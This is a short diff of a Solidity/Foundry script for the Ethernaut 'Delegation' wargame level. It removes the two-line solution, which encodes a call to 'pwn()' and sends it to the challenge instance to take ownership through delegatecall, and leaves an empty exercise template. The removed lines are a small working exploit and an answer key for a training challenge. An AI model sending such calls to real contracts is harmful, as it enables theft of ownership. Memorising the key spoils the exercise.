@@ -16,8 +16,6 @@ contract DelegationSolution is Script, EthernautHelper {
         address challengeInstance = createInstance(LEVEL_ADDRESS);
 
         // YOUR SOLUTION HERE
-        bytes memory data = abi.encodeWithSignature("pwn()");
-        challengeInstance.call(data);
         
 
         // SUBMIT CHALLENGE. (DON'T EDIT)
